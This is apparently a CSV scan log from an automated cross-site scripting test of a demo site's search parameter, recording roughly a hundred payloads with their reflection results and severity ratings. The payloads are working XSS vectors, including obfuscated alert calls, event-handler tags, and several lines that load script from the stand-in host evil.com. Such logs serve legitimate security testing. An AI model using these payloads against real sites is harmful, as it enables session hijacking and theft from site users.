+2026-01-10 17:01:12.669,2026-01-10 17:01:12.785,0.116,https://demo-knsl.onrender.com/search,GET,q,<applet code=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:12.670,2026-01-10 17:01:12.785,0.114,https://demo-knsl.onrender.com/search,GET,q,<script>al\x65rt(1)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:12.670,2026-01-10 17:01:12.785,0.114,https://demo-knsl.onrender.com/search,GET,q,<script>al\u0065rt(1)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:12.690,2026-01-10 17:01:12.789,0.099,https://demo-knsl.onrender.com/search,GET,q,<script>eval('al\x65rt(1)')</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:12.695,2026-01-10 17:01:12.795,0.100,https://demo-knsl.onrender.com/search,GET,q,<script>[1].find(alert)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:12.731,2026-01-10 17:01:12.845,0.114,https://demo-knsl.onrender.com/search,GET,q,<script>top['al'+'ert'](1)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:12.736,2026-01-10 17:01:12.845,0.109,https://demo-knsl.onrender.com/search,GET,q,<script>top[8680439..toString(30)](1)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:12.731,2026-01-10 17:01:12.851,0.120,https://demo-knsl.onrender.com/search,GET,q,<script>top[/al/.source+/ert/.source](1)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:12.785,2026-01-10 17:01:12.877,0.092,https://demo-knsl.onrender.com/search,GET,q,&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;,NO_REFLECTION,No,,Info
+2026-01-10 17:01:12.785,2026-01-10 17:01:12.915,0.130,https://demo-knsl.onrender.com/search,GET,q,&lt;script&gt;alert(1)&lt;/script&gt;,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:12.789,2026-01-10 17:01:12.915,0.126,https://demo-knsl.onrender.com/search,GET,q,<script>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:12.785,2026-01-10 17:01:12.925,0.141,https://demo-knsl.onrender.com/search,GET,q,&#60;script&#62;alert(1)&#60;/script&#62;,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:12.679,2026-01-10 17:01:12.937,0.258,https://demo-knsl.onrender.com/search,GET,q,<script>eval('al'+'ert(1)')</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:12.795,2026-01-10 17:01:12.949,0.154,https://demo-knsl.onrender.com/search,GET,q,<img src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:12.845,2026-01-10 17:01:12.950,0.105,https://demo-knsl.onrender.com/search,GET,q,<script	src=//evil.com></script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:12.851,2026-01-10 17:01:12.962,0.111,https://demo-knsl.onrender.com/search,GET,q,<script,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:12.845,2026-01-10 17:01:12.963,0.118,https://demo-knsl.onrender.com/search,GET,q,<script/src=//evil.com></script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:12.877,2026-01-10 17:01:12.989,0.112,https://demo-knsl.onrender.com/search,GET,q,src=//evil.com></script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:12.915,2026-01-10 17:01:13.044,0.129,https://demo-knsl.onrender.com/search,GET,q,<noscript><style></noscript><img src=x onerror=alert(1)></style></noscript>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:12.915,2026-01-10 17:01:13.051,0.136,https://demo-knsl.onrender.com/search,GET,q,<noscript><iframe></noscript><img src=x onerror=alert(1)></iframe></noscript>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:12.950,2026-01-10 17:01:13.055,0.105,https://demo-knsl.onrender.com/search,GET,q,<svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:12.937,2026-01-10 17:01:13.056,0.119,https://demo-knsl.onrender.com/search,GET,q,<textarea>&lt;img src=x onerror=alert(1)&gt;</textarea>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:12.949,2026-01-10 17:01:13.062,0.113,https://demo-knsl.onrender.com/search,GET,q,<xmp>&lt;img src=x onerror=alert(1)&gt;</xmp>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:12.962,2026-01-10 17:01:13.064,0.102,https://demo-knsl.onrender.com/search,GET,q,<svg><foreignObject><script>alert(1)</script></foreignObject></svg>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:12.963,2026-01-10 17:01:13.065,0.102,https://demo-knsl.onrender.com/search,GET,q,<template><slot onfocus=alert(1) autofocus></slot></template>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:12.328,2026-01-10 17:01:13.093,0.765,https://demo-knsl.onrender.com/search,GET,q,"<input pattern="".*"" title=""test"" onmouseover=alert(1)>",RAW_REFLECTION,No,,High
+2026-01-10 17:01:12.989,2026-01-10 17:01:13.119,0.130,https://demo-knsl.onrender.com/search,GET,q,<input type=text onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:13.044,2026-01-10 17:01:13.142,0.098,https://demo-knsl.onrender.com/search,GET,q,<input type=password onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:13.051,2026-01-10 17:01:13.165,0.114,https://demo-knsl.onrender.com/search,GET,q,<input type=email onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:13.055,2026-01-10 17:01:13.183,0.127,https://demo-knsl.onrender.com/search,GET,q,<input type=number onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:13.062,2026-01-10 17:01:13.183,0.121,https://demo-knsl.onrender.com/search,GET,q,<input type=tel onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:13.064,2026-01-10 17:01:13.183,0.119,https://demo-knsl.onrender.com/search,GET,q,<input type=url onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:13.065,2026-01-10 17:01:13.188,0.123,https://demo-knsl.onrender.com/search,GET,q,<input type=date onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:13.093,2026-01-10 17:01:13.203,0.110,https://demo-knsl.onrender.com/search,GET,q,<input type=time onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:13.142,2026-01-10 17:01:13.217,0.076,https://demo-knsl.onrender.com/search,GET,q,<input type=month onfocus=alert(1) autofocus>,NO_REFLECTION,No,,Info
+2026-01-10 17:01:13.119,2026-01-10 17:01:13.246,0.127,https://demo-knsl.onrender.com/search,GET,q,<input type=datetime-local onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:13.183,2026-01-10 17:01:13.253,0.070,https://demo-knsl.onrender.com/search,GET,q,<input type=button onclick=alert(1) value=X>,NO_REFLECTION,No,,Info
+2026-01-10 17:01:13.165,2026-01-10 17:01:13.262,0.097,https://demo-knsl.onrender.com/search,GET,q,<input type=week onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:13.183,2026-01-10 17:01:13.296,0.113,https://demo-knsl.onrender.com/search,GET,q,<input type=range onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:13.188,2026-01-10 17:01:13.298,0.111,https://demo-knsl.onrender.com/search,GET,q,<input type=reset onclick=alert(1) value=X>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:13.183,2026-01-10 17:01:13.299,0.117,https://demo-knsl.onrender.com/search,GET,q,<input type=color onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:13.056,2026-01-10 17:01:13.312,0.256,https://demo-knsl.onrender.com/search,GET,q,<input type=search onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:13.203,2026-01-10 17:01:13.318,0.116,https://demo-knsl.onrender.com/search,GET,q,<input type=submit onclick=alert(1) value=X>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:13.217,2026-01-10 17:01:13.320,0.103,https://demo-knsl.onrender.com/search,GET,q,<datalist onmouseover=alert(1)>X</datalist>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:13.246,2026-01-10 17:01:13.331,0.086,https://demo-knsl.onrender.com/search,GET,q,<input list=x><datalist id=x><option onclick=alert(1)>X</option></datalist>,NO_REFLECTION,No,,Info
+2026-01-10 17:01:13.262,2026-01-10 17:01:13.371,0.109,https://demo-knsl.onrender.com/search,GET,q,<keygen onchange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:13.253,2026-01-10 17:01:13.385,0.132,https://demo-knsl.onrender.com/search,GET,q,<keygen onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:13.318,2026-01-10 17:01:13.388,0.070,https://demo-knsl.onrender.com/search,GET,q,<img crossorigin=anonymous src=x onerror=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-10 17:01:13.320,2026-01-10 17:01:13.389,0.069,https://demo-knsl.onrender.com/search,GET,q,<script crossorigin=anonymous src=x onerror=alert(1)></script>,NO_REFLECTION,No,,Info
+2026-01-10 17:01:13.296,2026-01-10 17:01:13.425,0.130,https://demo-knsl.onrender.com/search,GET,q,<custom-element onclick=alert(1)>X</custom-element>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:13.299,2026-01-10 17:01:13.426,0.127,https://demo-knsl.onrender.com/search,GET,q,<source srcset=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:13.298,2026-01-10 17:01:13.426,0.128,https://demo-knsl.onrender.com/search,GET,q,<img srcset=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:13.312,2026-01-10 17:01:13.429,0.117,https://demo-knsl.onrender.com/search,GET,q,"<img sizes=""100vw"" srcset=x onerror=alert(1)>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:13.331,2026-01-10 17:01:13.430,0.099,https://demo-knsl.onrender.com/search,GET,q,"<script integrity=""sha384-x"" src=x onerror=alert(1)></script>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:13.371,2026-01-10 17:01:13.475,0.104,https://demo-knsl.onrender.com/search,GET,q,<img referrerpolicy=no-referrer src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:13.385,2026-01-10 17:01:13.481,0.095,https://demo-knsl.onrender.com/search,GET,q,<img loading=lazy src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:13.389,2026-01-10 17:01:13.489,0.100,https://demo-knsl.onrender.com/search,GET,q,<img importance=high src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:13.388,2026-01-10 17:01:13.494,0.106,https://demo-knsl.onrender.com/search,GET,q,<img decoding=async src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:13.426,2026-01-10 17:01:13.605,0.178,https://demo-knsl.onrender.com/search,GET,q,<img src=x onwaiting=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:13.429,2026-01-10 17:01:13.607,0.178,https://demo-knsl.onrender.com/search,GET,q,<img src=x onseeked=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:13.430,2026-01-10 17:01:13.607,0.176,https://demo-knsl.onrender.com/search,GET,q,<img src=x onplaying=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:13.426,2026-01-10 17:01:13.607,0.181,https://demo-knsl.onrender.com/search,GET,q,<img src=x onseeking=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:13.425,2026-01-10 17:01:13.608,0.182,https://demo-knsl.onrender.com/search,GET,q,<img src=x onabort=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:13.475,2026-01-10 17:01:13.612,0.137,https://demo-knsl.onrender.com/search,GET,q,<img src=x onplay=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:13.481,2026-01-10 17:01:13.615,0.134,https://demo-knsl.onrender.com/search,GET,q,<img src=x onpause=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:13.489,2026-01-10 17:01:13.618,0.128,https://demo-knsl.onrender.com/search,GET,q,<img src=x onloadstart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:13.494,2026-01-10 17:01:13.618,0.123,https://demo-knsl.onrender.com/search,GET,q,<img src=x onloadedmetadata=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:12.925,2026-01-10 17:01:13.713,0.787,https://demo-knsl.onrender.com/search,GET,q,<listing>&lt;img src=x onerror=alert(1)&gt;</listing>,RAW_REFLECTION,No,,High
+2026-01-10 17:01:13.607,2026-01-10 17:01:13.781,0.174,https://demo-knsl.onrender.com/search,GET,q,<img src=x oncanplaythrough=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:13.605,2026-01-10 17:01:13.781,0.177,https://demo-knsl.onrender.com/search,GET,q,<img src=x onloadeddata=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:13.608,2026-01-10 17:01:13.782,0.174,https://demo-knsl.onrender.com/search,GET,q,<img src=x oncanplay=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:13.607,2026-01-10 17:01:13.782,0.175,https://demo-knsl.onrender.com/search,GET,q,<img src=x ondurationchange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:13.615,2026-01-10 17:01:13.785,0.170,https://demo-knsl.onrender.com/search,GET,q,"<iframe sandbox=allow-scripts srcdoc=""<script>alert(1)</script>"">",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:13.612,2026-01-10 17:01:13.786,0.174,https://demo-knsl.onrender.com/search,GET,q,"<iframe sandbox=allow-scripts src=data:text/html,<script>alert(1)</script>>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:13.618,2026-01-10 17:01:13.787,0.169,https://demo-knsl.onrender.com/search,GET,q,<script>alert(document.domain)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:13.618,2026-01-10 17:01:13.817,0.199,https://demo-knsl.onrender.com/search,GET,q,<root><![CDATA[<script>alert(1)</script>]]></root>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:13.713,2026-01-10 17:01:13.817,0.105,https://demo-knsl.onrender.com/search,GET,q,<script>alert(window.location)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:13.817,2026-01-10 17:01:13.882,0.064,https://demo-knsl.onrender.com/search,GET,q,<acronym onmouseover=alert(1)>X</acronym>,NO_REFLECTION,No,,Info
+2026-01-10 17:01:13.786,2026-01-10 17:01:13.885,0.098,https://demo-knsl.onrender.com/search,GET,q,<script>alert(window.safari)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:13.781,2026-01-10 17:01:13.885,0.103,https://demo-knsl.onrender.com/search,GET,q,<script>alert(navigator.userAgent)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:13.782,2026-01-10 17:01:13.887,0.105,https://demo-knsl.onrender.com/search,GET,q,<script>'alert\u0028document.domain\u0029'</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:13.782,2026-01-10 17:01:13.887,0.106,https://demo-knsl.onrender.com/search,GET,q,<script>alert(sessionStorage.getItem('test'))</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:13.781,2026-01-10 17:01:13.890,0.108,https://demo-knsl.onrender.com/search,GET,q,<script>alert(localStorage.getItem('test'))</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:13.787,2026-01-10 17:01:13.890,0.103,https://demo-knsl.onrender.com/search,GET,q,<script>alert(window.chrome)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:13.785,2026-01-10 17:01:13.891,0.106,https://demo-knsl.onrender.com/search,GET,q,<script>alert(window.name)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:13.817,2026-01-10 17:01:13.950,0.133,https://demo-knsl.onrender.com/search,GET,q,<blink onmouseover=alert(1)>X</blink>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:13.887,2026-01-10 17:01:13.975,0.088,https://demo-knsl.onrender.com/search,GET,q,<font onmouseover=alert(1)>X</font>,NO_REFLECTION,No,,Info
+2026-01-10 17:01:13.882,2026-01-10 17:01:14.008,0.126,https://demo-knsl.onrender.com/search,GET,q,<big onmouseover=alert(1)>X</big>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:13.890,2026-01-10 17:01:14.015,0.125,https://demo-knsl.onrender.com/search,GET,q,<noframes onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:13.890,2026-01-10 17:01:14.063,0.174,https://demo-knsl.onrender.com/search,GET,q,<frameset onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:13.891,2026-01-10 17:01:14.064,0.173,https://demo-knsl.onrender.com/search,GET,q,<strike onmouseover=alert(1)>X</strike>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:13.885,2026-01-10 17:01:14.064,0.179,https://demo-knsl.onrender.com/search,GET,q,<dir onmouseover=alert(1)>X</dir>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:13.885,2026-01-10 17:01:14.064,0.180,https://demo-knsl.onrender.com/search,GET,q,<center onmouseover=alert(1)>X</center>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:13.887,2026-01-10 17:01:14.069,0.182,https://demo-knsl.onrender.com/search,GET,q,<frame onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:13.950,2026-01-10 17:01:14.069,0.120,https://demo-knsl.onrender.com/search,GET,q,<tt onmouseover=alert(1)>X</tt>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:13.975,2026-01-10 17:01:14.098,0.123,https://demo-knsl.onrender.com/search,GET,q,<script>alert(1);alert(2);alert(3)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:14.015,2026-01-10 17:01:14.122,0.107,https://demo-knsl.onrender.com/search,GET,q,<script>while(1){alert(1);break}</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:14.008,2026-01-10 17:01:14.122,0.114,https://demo-knsl.onrender.com/search,GET,q,<script>for(i=0;i<3;i++){alert(i)}</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:14.063,2026-01-10 17:01:14.183,0.119,https://demo-knsl.onrender.com/search,GET,q,<script>if(1){alert(1)}</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:14.064,2026-01-10 17:01:14.183,0.119,https://demo-knsl.onrender.com/search,GET,q,<script>alert(1)&&alert(2)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:14.069,2026-01-10 17:01:14.186,0.117,https://demo-knsl.onrender.com/search,GET,q,"<script>alert([1,2,3])</script>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:14.064,2026-01-10 17:01:14.186,0.122,https://demo-knsl.onrender.com/search,GET,q,<script>try{alert(1)}catch(e){}</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:14.069,2026-01-10 17:01:14.186,0.117,https://demo-knsl.onrender.com/search,GET,q,<script>alert(1)?alert(2):alert(3)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:14.064,2026-01-10 17:01:14.188,0.125,https://demo-knsl.onrender.com/search,GET,q,<script>alert(1)||alert(2)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:14.098,2026-01-10 17:01:14.202,0.103,https://demo-knsl.onrender.com/search,GET,q,"<script>alert({x:1,y:2})</script>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:14.122,2026-01-10 17:01:14.258,0.136,https://demo-knsl.onrender.com/search,GET,q,<script>alert((()=>1)())</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:14.122,2026-01-10 17:01:14.258,0.136,https://demo-knsl.onrender.com/search,GET,q,<script>alert(function(){return 1}())</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:14.183,2026-01-10 17:01:14.301,0.119,https://demo-knsl.onrender.com/search,GET,q,<script>alert(class{constructor(){return 1}})</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:13.607,2026-01-10 17:01:14.575,0.968,https://demo-knsl.onrender.com/search,GET,q,<img src=x onended=alert(1)>,RAW_REFLECTION,No,,High
